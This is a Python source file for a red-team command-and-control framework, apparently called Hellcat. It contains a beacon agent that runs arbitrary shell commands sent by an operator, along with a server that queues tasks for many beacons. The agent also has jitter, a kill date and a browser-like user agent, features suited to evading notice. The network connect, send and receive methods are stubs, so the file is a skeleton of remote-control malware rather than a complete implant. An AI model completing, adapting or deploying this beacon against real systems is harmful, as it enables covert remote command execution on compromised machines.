"""
Hellcat C2 Beacon Framework
============================
Lightweight C2 beacon + server with pluggable tunnels (HTTP/DNS/WS/ICMP).
Ported from AutoRedTeam-Orchestrator core/c2/.
"""
from __future__ import annotations

import logging
import threading
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

from hellcat.core.models import (
    BeaconInfo, BeaconMode, C2Status, Task, TaskResult, TaskTypes, TunnelType,
)

logger = logging.getLogger("hellcat.c2")


# ---------------------------------------------------------------------------
# C2 Config
# ---------------------------------------------------------------------------

@dataclass
class C2Config:
    server: str = "127.0.0.1"
    port: int = 443
    protocol: str = "https"
    interval: float = 60.0
    jitter: float = 0.2
    timeout: float = 30.0
    max_retries: int = 3
    encryption: str = "aes256_gcm"
    key: Optional[bytes] = None
    proxy: Optional[str] = None
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    headers: Dict[str, str] = field(default_factory=dict)
    domain: Optional[str] = None
    checkin_path: str = "/api/init"
    task_path: str = "/api/poll"
    result_path: str = "/api/data"
    close_path: str = "/api/close"

    def get_base_url(self) -> str:
        return f"{self.protocol}://{self.server}:{self.port}"


# ---------------------------------------------------------------------------
# Abstract tunnel
# ---------------------------------------------------------------------------

class BaseTunnel(ABC):
    def __init__(self, config: C2Config) -> None:
        self.config = config
        self._connected = False

    @property
    def connected(self) -> bool:
        return self._connected

    @abstractmethod
    def connect(self) -> bool: ...
    @abstractmethod
    def disconnect(self) -> None: ...
    @abstractmethod
    def send(self, data: bytes) -> bool: ...
    @abstractmethod
    def receive(self, timeout: Optional[float] = None) -> Optional[bytes]: ...


# ---------------------------------------------------------------------------
# Abstract C2 base
# ---------------------------------------------------------------------------

class BaseC2(ABC):
    def __init__(self, config: C2Config) -> None:
        self.config = config
        self.status = C2Status.IDLE
        self._handlers: Dict[str, Callable[[Any], Any]] = {}
        self._status_callbacks: List[Callable[[C2Status], None]] = []

    def _set_status(self, status: C2Status) -> None:
        self.status = status
        for cb in self._status_callbacks:
            try:
                cb(status)
            except Exception:
                pass

    def on_status_change(self, callback: Callable[[C2Status], None]) -> None:
        self._status_callbacks.append(callback)

    def register_handler(self, task_type: str, handler: Callable[[Any], Any]) -> None:
        self._handlers[task_type] = handler

    def unregister_handler(self, task_type: str) -> None:
        self._handlers.pop(task_type, None)

    def process_task(self, task: Task) -> TaskResult:
        handler = self._handlers.get(task.type)
        if not handler:
            return TaskResult(task_id=task.id, success=False, error=f"No handler for {task.type}")
        start = time.time()
        try:
            output = handler(task.payload)
            return TaskResult(task_id=task.id, success=True, output=output, elapsed=time.time() - start)
        except Exception as exc:
            return TaskResult(task_id=task.id, success=False, error=str(exc), elapsed=time.time() - start)

    @abstractmethod
    def connect(self) -> bool: ...
    @abstractmethod
    def disconnect(self) -> None: ...
    @abstractmethod
    def send(self, data: bytes) -> bool: ...
    @abstractmethod
    def receive(self) -> Optional[bytes]: ...


# ---------------------------------------------------------------------------
# Beacon (simplified implementation)
# ---------------------------------------------------------------------------

@dataclass
class BeaconConfig(C2Config):
    initial_delay: float = 0.0
    kill_date: Optional[float] = None
    shell_timeout: int = 60
    max_output_size: int = 10000


class Beacon(BaseC2):
    """Heartbeat-based C2 agent with task queue processing."""

    def __init__(self, config: BeaconConfig) -> None:
        super().__init__(config)
        self.config: BeaconConfig = config
        self.info = BeaconInfo()
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._register_default_handlers()

    def _register_default_handlers(self) -> None:
        self.register_handler(TaskTypes.SHELL, self._handle_shell)
        self.register_handler(TaskTypes.SLEEP, self._handle_sleep)
        self.register_handler(TaskTypes.EXIT, self._handle_exit)
        self.register_handler(TaskTypes.PWD, lambda _: __import__("os").getcwd())
        self.register_handler(TaskTypes.CHECKIN, lambda _: self.info.to_dict())

    def _handle_shell(self, command: str) -> str:
        import subprocess
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True,
                timeout=self.config.shell_timeout,
            )
            output = result.stdout + result.stderr
            return output[:self.config.max_output_size]
        except subprocess.TimeoutExpired:
            return "[timeout]"

    def _handle_sleep(self, payload: Any) -> str:
        if isinstance(payload, (int, float)):
            self.config.interval = float(payload)
        return f"Sleep set to {self.config.interval}s"

    def _handle_exit(self, _: Any) -> str:
        self._running = False
        return "Exiting"

    def connect(self) -> bool:
        self._set_status(C2Status.CONNECTING)
        # In a real implementation this contacts the C2 server
        self._set_status(C2Status.CONNECTED)
        return True

    def disconnect(self) -> None:
        self._running = False
        self._set_status(C2Status.DISCONNECTED)

    def send(self, data: bytes) -> bool:
        return True  # stub

    def receive(self) -> Optional[bytes]:
        return None  # stub

    def start(self) -> None:
        self._running = True
        self._thread = threading.Thread(target=self._beacon_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._running = False

    def _beacon_loop(self) -> None:
        if self.config.initial_delay:
            time.sleep(self.config.initial_delay)
        self.connect()
        while self._running:
            if self.config.kill_date and time.time() > self.config.kill_date:
                self._running = False
                break
            self.info.last_seen = time.time()
            time.sleep(self.config.interval)


# ---------------------------------------------------------------------------
# Beacon Server (lightweight)
# ---------------------------------------------------------------------------

class BeaconServer:
    """Manages connected beacons and dispatches tasks."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8080,
                 max_beacons: int = 1000) -> None:
        self.host = host
        self.port = port
        self.max_beacons = max_beacons
        self._beacons: Dict[str, BeaconInfo] = {}
        self._task_queues: Dict[str, List[Task]] = {}
        self._results: Dict[str, List[TaskResult]] = {}
        self._lock = threading.Lock()

    def add_task(self, beacon_id: str, task_type: str, payload: Any,
                 timeout: float = 300.0) -> str:
        task = Task.create(task_type, payload, timeout)
        with self._lock:
            self._task_queues.setdefault(beacon_id, []).append(task)
        return task.id

    def get_beacons(self) -> List[BeaconInfo]:
        return list(self._beacons.values())

    def get_results(self, beacon_id: str) -> List[TaskResult]:
        return self._results.get(beacon_id, [])

    def register_beacon(self, info: BeaconInfo) -> None:
        with self._lock:
            self._beacons[info.beacon_id] = info

    def get_stats(self) -> Dict[str, Any]:
        return {
            "total_beacons": len(self._beacons),
            "total_tasks": sum(len(q) for q in self._task_queues.values()),
            "total_results": sum(len(r) for r in self._results.values()),
        }
